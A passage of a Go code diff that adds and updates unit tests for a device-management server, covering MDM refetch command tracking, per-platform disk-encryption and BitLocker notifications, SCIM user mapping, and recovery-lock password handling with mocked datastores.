+		env.mdmStorage.EnqueueCommandFunc = func(ctx context.Context, id []string, cmd *nanomdm.CommandWithSubtype) (map[string]error, error) {
+			env.events = append(env.events, "enqueue:"+refetchCommandTypeFromUUID(cmd.CommandUUID))
+			return nil, nil
+		}
+
+		return env
+	}
+
+	t.Run("tracking rows are written before each enqueue", func(t *testing.T) {
+		env := setup(t, &mockAPNSPusher{})
+
+		require.NoError(t, env.svc.RefetchHost(test.UserContext(env.ctx, test.UserAdmin), host.ID))
+		require.Equal(t, []string{
+			"add:" + fleet.RefetchAppsCommandUUIDPrefix,
+			"enqueue:" + fleet.RefetchAppsCommandUUIDPrefix,
+			"add:" + fleet.RefetchCertsCommandUUIDPrefix,
+			"enqueue:" + fleet.RefetchCertsCommandUUIDPrefix,
+			"add:" + fleet.RefetchDeviceCommandUUIDPrefix,
+			"enqueue:" + fleet.RefetchDeviceCommandUUIDPrefix,
+		}, env.events)
+	})
+
+	t.Run("enqueue failure untracks only the failed command type", func(t *testing.T) {
+		env := setup(t, &mockAPNSPusher{})
+		env.mdmStorage.EnqueueCommandFunc = func(ctx context.Context, id []string, cmd *nanomdm.CommandWithSubtype) (map[string]error, error) {
+			commandType := refetchCommandTypeFromUUID(cmd.CommandUUID)
+			if commandType == fleet.RefetchCertsCommandUUIDPrefix {
+				return nil, errors.New("db down")
+			}
+			env.events = append(env.events, "enqueue:"+commandType)
+			return nil, nil
+		}
+
+		require.Error(t, env.svc.RefetchHost(test.UserContext(env.ctx, test.UserAdmin), host.ID))
+		require.Equal(t, []string{
+			"add:" + fleet.RefetchAppsCommandUUIDPrefix,
+			"enqueue:" + fleet.RefetchAppsCommandUUIDPrefix,
+			"add:" + fleet.RefetchCertsCommandUUIDPrefix,
+			"remove:" + fleet.RefetchCertsCommandUUIDPrefix,
+		}, env.events)
+	})
+
+	t.Run("push failure keeps the tracking row", func(t *testing.T) {
+		env := setup(t, &mockAPNSPusher{failUUIDs: map[string]bool{host.UUID: true}})
+
+		// the first command's push fails, so RefetchHost returns an error, but
+		// the command is durably enqueued and its tracking row must stay
+		require.Error(t, env.svc.RefetchHost(test.UserContext(env.ctx, test.UserAdmin), host.ID))
+		require.False(t, env.ds.RemoveHostMDMCommandFuncInvoked)
+		require.Equal(t, []string{
+			"add:" + fleet.RefetchAppsCommandUUIDPrefix,
+			"enqueue:" + fleet.RefetchAppsCommandUUIDPrefix,
+		}, env.events)
+	})
+}
+
 func TestEmptyTeamOSVersions(t *testing.T) {
 	ds := new(mock.Store)
 	svc, ctx := newTestService(t, ds, nil, nil)
@@ -3830,6 +4392,9 @@ func TestHostEncryptionKey(t *testing.T) {
 // Fragile test: This test is fragile because of the large reliance on Datastore mocks. Consider refactoring test/logic or removing the test. It may be slowing us down more than helping us.
 func TestHostMDMProfileDetail(t *testing.T) {
 	ds := new(mock.Store)
+	ds.GetConfigEnableDiskEncryptionFunc = func(ctx context.Context, teamID *uint) (fleet.DiskEncryptionConfig, error) {
+		return fleet.DiskEncryptionConfig{}, nil
+	}
 	testCert, testKey, err := apple_mdm.NewSCEPCACertKey()
 	require.NoError(t, err)
 	testCertPEM := tokenpki.PEMCertificate(testCert.Raw)
@@ -3966,6 +4531,9 @@ func TestHostMDMProfileDetail(t *testing.T) {
 // Fragile test: This test is fragile because of the large reliance on Datastore mocks. Consider refactoring test/logic or removing the test. It may be slowing us down more than helping us.
 func TestHostMDMProfileScopes(t *testing.T) {
 	ds := new(mock.Store)
+	ds.GetConfigEnableDiskEncryptionFunc = func(ctx context.Context, teamID *uint) (fleet.DiskEncryptionConfig, error) {
+		return fleet.DiskEncryptionConfig{}, nil
+	}
 	testCert, testKey, err := apple_mdm.NewSCEPCACertKey()
 	require.NoError(t, err)
 	testCertPEM := tokenpki.PEMCertificate(testCert.Raw)
@@ -4726,6 +5294,65 @@ func TestSetDiskEncryptionNotifications(t *testing.T) {
 			expectedError: false,
 		},
 		{
+			// The wiring this feature exists for: encrypted, protection off, key escrowed and decryptable, so the
+			// encrypt path stands down and the restore path is asked to act instead.
+			name: "windows encrypted but unprotected is asked to restore protection",
+			host: &fleet.Host{
+				ID: 1, Platform: "windows", OsqueryHostID: new("foo"),
+				DiskEncryptionEnabled:     new(true),
+				BitLockerProtectionStatus: new(fleet.BitLockerProtectionStatusOff),
+			},
+			appConfig: &fleet.AppConfig{
+				MDM: fleet.MDM{EnabledAndConfigured: true},
+			},
+			diskEncryptionConfigured: true,
+			isConnectedToFleetMDM:    true,
+			mdmInfo:                  &fleet.HostMDM{IsServer: false},
+			getHostDiskEncryptionKey: func(ctx context.Context, id uint) (*fleet.HostDiskEncryptionKey, error) {
+				return &fleet.HostDiskEncryptionKey{Decryptable: new(true)}, nil
+			},
+			expectedNotifications: &fleet.OrbitConfigNotifications{
+				EnableBitLockerProtection: true,
+			},
+			expectedError: false,
+		},
+		{
+			// Same qualifying state, but BitLocker is not managed on Windows Server, so the guard stops before the gate.
+			name: "windows server encrypted but unprotected is left alone",
+			host: &fleet.Host{
+				ID: 1, Platform: "windows", OsqueryHostID: new("foo"),
+				DiskEncryptionEnabled:     new(true),
+				BitLockerProtectionStatus: new(fleet.BitLockerProtectionStatusOff),
+			},
+			appConfig: &fleet.AppConfig{
+				MDM: fleet.MDM{EnabledAndConfigured: true},
+			},
+			diskEncryptionConfigured: true,
+			isConnectedToFleetMDM:    true,
+			mdmInfo:                  &fleet.HostMDM{IsServer: true},
+			getHostDiskEncryptionKey: func(ctx context.Context, id uint) (*fleet.HostDiskEncryptionKey, error) {
+				return &fleet.HostDiskEncryptionKey{Decryptable: new(true)}, nil
+			},
+			expectedNotifications: &fleet.OrbitConfigNotifications{},
+			expectedError:         false,
+		},
+		{
+			// A Windows host with no MDM row has nothing to enforce against.
+			name: "windows with no mdm info",
+			host: &fleet.Host{ID: 1, Platform: "windows", DiskEncryptionEnabled: new(false), OsqueryHostID: new("foo")},
+			appConfig: &fleet.AppConfig{
+				MDM: fleet.MDM{EnabledAndConfigured: true},
+			},
+			diskEncryptionConfigured: true,
+			isConnectedToFleetMDM:    true,
+			mdmInfo:                  nil,
+			getHostDiskEncryptionKey: func(ctx context.Context, id uint) (*fleet.HostDiskEncryptionKey, error) {
+				return nil, newNotFoundError()
+			},
+			expectedNotifications: &fleet.OrbitConfigNotifications{},
+			expectedError:         false,
+		},
+		{
 			name: "windows with encryption enabled but key missing",
 			host: &fleet.Host{ID: 1, Platform: "windows", DiskEncryptionEnabled: new(true), OsqueryHostID: new("foo")},
 			appConfig: &fleet.AppConfig{
@@ -4814,13 +5441,25 @@ func TestSetDiskEncryptionNotifications(t *testing.T) {
 				ctx = capabilities.NewContext(ctx, &r)
 			}
 
+			// "configured" means configured for every platform; per-platform
+			// gating has its own cases below the table-driven run
+			var diskEncryption fleet.DiskEncryptionConfig
+			if tt.diskEncryptionConfigured {
+				diskEncryption = fleet.DiskEncryptionConfig{
+					MacOSEnabled:       true,
+					MacOSEscrowEnabled: true,
+					WindowsEnabled:     true,
+					LinuxEscrowEnabled: true,
+				}
+			}
+
 			notifs := &fleet.OrbitConfigNotifications{}
 			err := svc.setDiskEncryptionNotifications(
 				ctx,
 				notifs,
 				tt.host,
 				tt.appConfig,
-				tt.diskEncryptionConfigured,
+				diskEncryption,
 				tt.isConnectedToFleetMDM,
 				tt.mdmInfo,
 			)
@@ -4830,9 +5469,82 @@ func TestSetDiskEncryptionNotifications(t *testing.T) {
 			} else {
 				require.NoError(t, err)
 			}
-			require.Equal(t, tt.expectedNotifications.RotateDiskEncryptionKey, notifs.RotateDiskEncryptionKey)
+			require.Equal(t, tt.expectedNotifications, notifs)
 		})
 	}
+
+	t.Run("notifications follow the host platform's setting, not the aggregate", func(t *testing.T) {
+		appConfig := &fleet.AppConfig{MDM: fleet.MDM{EnabledAndConfigured: true, WindowsEnabledAndConfigured: true}}
+		ds.AppConfigFunc = func(ctx context.Context) (*fleet.AppConfig, error) {
+			return appConfig, nil
+		}
+		ds.GetHostDiskEncryptionKeyFunc = func(ctx context.Context, id uint) (*fleet.HostDiskEncryptionKey, error) {
+			return nil, newNotFoundError()
+		}
+		r := http.Request{
+			Header: http.Header{fleet.CapabilitiesHeader: []string{string(fleet.CapabilityEscrowBuddy)}},
+		}
+		ctx := capabilities.NewContext(ctx, &r)
+
+		windowsHost := &fleet.Host{ID: 1, Platform: "windows", DiskEncryptionEnabled: new(false), OsqueryHostID: new("foo")}
+		macHost := &fleet.Host{ID: 2, Platform: "darwin", OsqueryHostID: new("foo")}
+		mdmInfo := &fleet.HostMDM{IsServer: false}
+
+		// only Windows configured: the Windows host is notified even though the
+		// aggregate (AND of the four settings) is off
+		notifs := &fleet.OrbitConfigNotifications{}
+		err := svc.setDiskEncryptionNotifications(ctx, notifs, windowsHost, appConfig,
+			fleet.DiskEncryptionConfig{WindowsEnabled: true}, true, mdmInfo)
+		require.NoError(t, err)
+		require.True(t, notifs.EnforceBitLockerEncryption)
+
+		// only macOS configured: the Windows host is not notified
+		notifs = &fleet.OrbitConfigNotifications{}
+		err = svc.setDiskEncryptionNotifications(ctx, notifs, windowsHost, appConfig,
+			fleet.DiskEncryptionConfig{MacOSEnabled: true, MacOSEscrowEnabled: true}, true, mdmInfo)
+		require.NoError(t, err)
+		require.False(t, notifs.EnforceBitLockerEncryption)
+
+		// only Windows configured: the macOS host's key-fetch path is skipped
+		// entirely, so no rotation is requested
+		notifs = &fleet.OrbitConfigNotifications{}
+		err = svc.setDiskEncryptionNotifications(ctx, notifs, macHost, appConfig,
+			fleet.DiskEncryptionConfig{WindowsEnabled: true}, true, mdmInfo)
+		require.NoError(t, err)
+		require.False(t, notifs.RotateDiskEncryptionKey)
+	})
+
+	t.Run("macOS rotation follows escrow, not enforcement", func(t *testing.T) {
+		appConfig := &fleet.AppConfig{MDM: fleet.MDM{EnabledAndConfigured: true}}
+		ds.AppConfigFunc = func(ctx context.Context) (*fleet.AppConfig, error) {
+			return appConfig, nil
+		}
+		// a key that Fleet cannot decrypt is what makes rotation wanted
+		ds.GetHostDiskEncryptionKeyFunc = func(ctx context.Context, id uint) (*fleet.HostDiskEncryptionKey, error) {
+			return &fleet.HostDiskEncryptionKey{Decryptable: new(false)}, nil
+		}
+		r := http.Request{
+			Header: http.Header{fleet.CapabilitiesHeader: []string{string(fleet.CapabilityEscrowBuddy)}},
+		}
+		ctx := capabilities.NewContext(ctx, &r)
+		macHost := &fleet.Host{ID: 2, Platform: "darwin", OsqueryHostID: new("foo")}
+		mdmInfo := &fleet.HostMDM{IsServer: false}
+
+		// escrow on: Escrow Buddy is asked to produce a key Fleet can store
+		notifs := &fleet.OrbitConfigNotifications{}
+		err := svc.setDiskEncryptionNotifications(ctx, notifs, macHost, appConfig,
+			fleet.DiskEncryptionConfig{MacOSEscrowEnabled: true}, true, mdmInfo)
+		require.NoError(t, err)
+		require.True(t, notifs.RotateDiskEncryptionKey)
+
+		// enforcement alone: the profile carries no escrow payload, so rotating
+		// would produce a key with nowhere to go
+		notifs = &fleet.OrbitConfigNotifications{}
+		err = svc.setDiskEncryptionNotifications(ctx, notifs, macHost, appConfig,
+			fleet.DiskEncryptionConfig{MacOSEnabled: true}, true, mdmInfo)
+		require.NoError(t, err)
+		require.False(t, notifs.RotateDiskEncryptionKey)
+	})
 }
 
 func TestGetHostDetailsExcludeSoftwareFlag(t *testing.T) {
@@ -5050,7 +5762,7 @@ func TestSetHostDeviceMapping(t *testing.T) {
 		assert.Equal(t, fleet.DeviceMappingMDMIdpAccounts, result[0].Source)
 	})
 
-	t.Run("IDP source same email returns early without updates", func(t *testing.T) {
+	t.Run("IDP source same email skips email update but still reconciles SCIM mapping", func(t *testing.T) {
 		ds := new(mock.Store)
 		svc, ctx := newTestService(t, ds, nil, nil, &TestServerOpts{License: &fleet.LicenseInfo{Tier: fleet.TierPremium}})
 
@@ -5063,6 +5775,14 @@ func TestSetHostDeviceMapping(t *testing.T) {
 		ds.ListHostDeviceMappingFunc = func(ctx context.Context, hostID uint) ([]*fleet.HostDeviceMapping, error) {
 			return []*fleet.HostDeviceMapping{{HostID: hostID, Email: "user@example.com", Source: fleet.DeviceMappingIDP}}, nil
 		}
+		ds.ScimUserByUserNameOrEmailFunc = func(ctx context.Context, userName, email string) (*fleet.ScimUser, error) {
+			return &fleet.ScimUser{ID: 2, UserName: "user@example.com"}, nil
+		}
+		ds.SetOrUpdateHostSCIMUserMappingFunc = func(ctx context.Context, hostID uint, scimUserID uint) ([]fleet.ActivityTypeResentCertificate, error) {
+			require.Equal(t, uint(1), hostID)
+			require.Equal(t, uint(2), scimUserID)
+			return nil, nil
+		}
 
 		userCtx := test.UserContext(ctx, test.UserAdmin)
 		result, err := svc.SetHostDeviceMapping(userCtx, 1, "user@example.com", fleet.DeviceMappingIDP)
@@ -5071,9 +5791,11 @@ func TestSetHostDeviceMapping(t *testing.T) {
 		require.Len(t, result, 1)
 		assert.Equal(t, "user@example.com", result[0].Email)
 
-		// These should NOT be invoked because the email hasn't changed
+		// Email update should NOT be invoked because the email hasn't changed
 		require.False(t, ds.SetOrUpdateIDPHostDeviceMappingFuncInvoked)
-		require.False(t, ds.SetOrUpdateHostSCIMUserMappingFuncInvoked)
+		// But SCIM mapping SHOULD still be reconciled (fixes #46624)
+		require.True(t, ds.ScimUserByUserNameOrEmailFuncInvoked)
+		require.True(t, ds.SetOrUpdateHostSCIMUserMappingFuncInvoked)
 	})
 
 	t.Run("IDP source different email proceeds with update", func(t *testing.T) {
@@ -5836,7 +6558,8 @@ func TestGetHostRecoveryLockPassword(t *testing.T) {
 		}
 		ds.GetHostRecoveryLockPasswordFunc = func(ctx context.Context, hostUUID string) (*fleet.HostRecoveryLockPassword, error) {
 			return &fleet.HostRecoveryLockPassword{
-				Password: "test-password",
+				Password: new("test-password"),
+				Status:   &fleet.MDMDeliveryVerified,
 			}, nil
 		}
 		ds.MarkRecoveryLockPasswordViewedFunc = func(ctx context.Context, hostUUID string) (time.Time, error) {
@@ -5849,7 +6572,8 @@ func TestGetHostRecoveryLockPassword(t *testing.T) {
 		userCtx := test.UserContext(ctx, test.UserAdmin)
 		password, err := svc.GetHostRecoveryLockPassword(userCtx, 3)
 		require.NoError(t, err)
-		assert.Equal(t, "test-password", password.Password)
+		require.NotNil(t, password.Password)
+		assert.Equal(t, "test-password", *password.Password)
 	})
 
 	t.Run("calls MarkRecoveryLockPasswordViewed and sets auto_rotate_at", func(t *testing.T) {
@@ -5875,7 +6599,8 @@ func TestGetHostRecoveryLockPassword(t *testing.T) {
 		}
 		ds.GetHostRecoveryLockPasswordFunc = func(ctx context.Context, hostUUID string) (*fleet.HostRecoveryLockPassword, error) {
 			return &fleet.HostRecoveryLockPassword{
-				Password: "test-password-4",
+				Password: new("test-password-4"),
+				Status:   &fleet.MDMDeliveryVerified,
 			}, nil
 		}
 		opts.ActivityMock.NewActivityFunc = func(_ context.Context, _ *activity_api.User, _ activity_api.ActivityDetails) error {
@@ -5893,7 +6618,8 @@ func TestGetHostRecoveryLockPassword(t *testing.T) {
 		userCtx := test.UserContext(ctx, test.UserAdmin)
 		password, err := svc.GetHostRecoveryLockPassword(userCtx, 4)
 		require.NoError(t, err)
-		assert.Equal(t, "test-password-4", password.Password)
+		require.NotNil(t, password.Password)
+		assert.Equal(t, "test-password-4", *password.Password)
 		assert.True(t, markViewedCalled, "MarkRecoveryLockPasswordViewed should be called")
 		require.NotNil(t, password.AutoRotateAt)
 		assert.WithinDuration(t, expectedRotateAt, *password.AutoRotateAt, 1*time.Second)
@@ -5922,7 +6648,8 @@ func TestGetHostRecoveryLockPassword(t *testing.T) {
 		}
 		ds.GetHostRecoveryLockPasswordFunc = func(ctx context.Context, hostUUID string) (*fleet.HostRecoveryLockPassword, error) {
 			return &fleet.HostRecoveryLockPassword{
-				Password: "test-password-5",
+				Password: new("test-password-5"),
+				Status:   &fleet.MDMDeliveryVerified,
 			}, nil
 		}
 		ds.MarkRecoveryLockPasswordViewedFunc = func(ctx context.Context, hostUUID string) (time.Time, error) {
